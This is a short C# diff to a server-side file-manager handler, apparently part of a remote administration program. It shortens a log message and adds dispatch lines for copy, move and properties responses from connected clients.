@@ -71,7 +71,6 @@ namespace MLManagementServer.Handlers
         public static void Handle(IClient c, object[] data)
         {
             FileManagerCommand command = (FileManagerCommand)data[1];
-
             if (command == FileManagerCommand.DownloadInvalid)
             {
                 string downloadHandle = (string)data[2];
@@ -102,10 +101,10 @@ namespace MLManagementServer.Handlers
             }
             if (FormHandler.ContainsKey(c.ID))
             {
-                
-                Console.WriteLine("File Manager: {0}", command.ToString());
-
-                
+                Console.WriteLine("FM: {0}", command.ToString());
+                if (command == FileManagerCommand.CopyResponce) FormHandler[c.ID].HandleCopyResponce((Guid)data[2], (bool)data[3]);
+                if (command == FileManagerCommand.MoveResponce) FormHandler[c.ID].HandleMoveResponce((Guid)data[2], (bool)data[3]);
+                if (command == FileManagerCommand.PropertiesResponce) FormHandler[c.ID].HandleProperties(data);
 
                 if (command == FileManagerCommand.DriveResponce)
                 {
